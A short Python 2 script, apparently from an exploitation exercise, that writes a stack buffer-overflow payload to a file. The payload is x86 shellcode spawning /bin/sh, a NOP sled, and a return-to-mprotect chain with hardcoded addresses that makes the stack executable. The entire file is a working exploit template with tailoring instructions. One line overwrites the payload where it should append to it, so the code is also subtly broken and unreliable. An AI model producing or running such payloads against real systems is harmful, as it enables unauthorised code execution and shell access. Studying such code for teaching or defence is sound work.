#!/usr/bin/env python2

import sys
import struct


def exploit() : 

    
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"

    # Let us add some nops in the beginning.
    nops = '\x90' * 70

    # Now, junk length is, 
    junk_length = 112 - len(shellcode) - len(nops)

    # Variables related to calling mprotect.
    # NOTE: Change these values to suit your exploit. 
    mprotect_address = 0xf7ed5da0
    return_address = 0x63636363
    argument0 = 0xfffdc000
    argument1 = 139264
    argument2 = 7

    # First nops
    payload = nops

    # Then shellcode
    payload += shellcode

    # Then fill the rest junk.
    payload = junk_length * 'a'
    
    # mprotect's address in little-endian form. This will overwrite func's return address. 
    payload += struct.pack('<I', mprotect_address)
    
    # mprotect's return address
    payload += struct.pack('<I', return_address)

    # The 3 arguments, each in little-endian form. 
    payload += struct.pack('<I', argument0)
    payload += struct.pack('<I', argument1)
    payload += struct.pack('<I', argument2)
    
    f = open("exploit.txt", "wb")
    f.write(payload)
    f.close()


if __name__ == "__main__" : 
    exploit()
